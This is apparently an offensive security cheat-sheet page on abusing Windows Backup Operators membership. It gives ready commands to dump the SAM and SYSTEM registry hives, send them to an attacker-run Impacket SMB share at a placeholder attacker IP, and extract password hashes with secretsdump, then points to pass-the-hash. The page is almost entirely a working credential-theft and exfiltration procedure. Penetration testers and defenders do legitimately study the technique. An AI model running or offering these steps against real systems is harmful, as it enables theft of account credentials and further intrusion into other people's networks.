# Backup Operators Group

\#The **SAM** (Security Account Manager) database in Windows stores user account credentials, and the **SYSTEM** file holds the boot key necessary to decrypt these credentials. \
The **Backup Operators** group can bypass file permissions to back up sensitive files like these.

### **1. Backup SYSTEM and SAM Files**

The **`hklm\sam`** and **`hklm\system`** registry hives correspond to the SAM and SYSTEM files.

```batch
reg save hklm\sam C:\temp\sam.backup
reg save hklm\system C:\temp\system.backup
```

### 2. Transfer the Files Using SMB

On your **attacker machine**, set up a simple SMB server with Impacket.&#x20;

```bash
impacket-smbserver <share_name> <dest_folder_path> -smb2support
```

From the **target machine**, copy the backed-up files to the share on the attacker machine.

```batch
copy C:\temp\sam.backup \\<attacker_ip>\<share_name>\sam.backup
copy C:\temp\system.backup \\<attacker_ip>\<share_name>\system.backup
```

### 3. Extracting the hashes

Now that the **SAM** and **SYSTEM** files are transferred to the attacker machine, it's possible extract password hashes from them using **impacket-secretsdump**.

```bash
impacket-secretsdump -sam sam.backup -system system.backup LOCAL
```

### 4. Pass The Hash

[#pass-the-hash](../../misc/ntlm.md#pass-the-hash "mention")
